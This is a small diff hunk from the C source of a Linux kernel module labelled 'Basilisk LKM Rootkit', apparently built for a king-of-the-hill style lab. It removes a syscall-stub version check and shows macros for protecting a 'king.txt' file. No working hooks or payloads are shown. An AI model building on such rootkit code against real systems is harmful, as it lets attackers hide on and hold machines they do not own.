@@ -24,10 +24,6 @@ MODULE_AUTHOR("Skelly");
 MODULE_DESCRIPTION("Basilisk LKM Rootkit");
 MODULE_VERSION("2.0");
 
-#if defined(CONFIG_X86_64) && (LINUX_VERSION_CODE >= KERNEL_VERSION(4,17,0))
-#define PTREGS_SYSCALL_STUBS 1
-#endif
-
 /* Macros for protecting king.txt */
 #define KING_FILENAME "/home/vagrant/king.txt" // Path to king file
 #define KING_FILENAME_LEN strlen(KING_FILENAME)
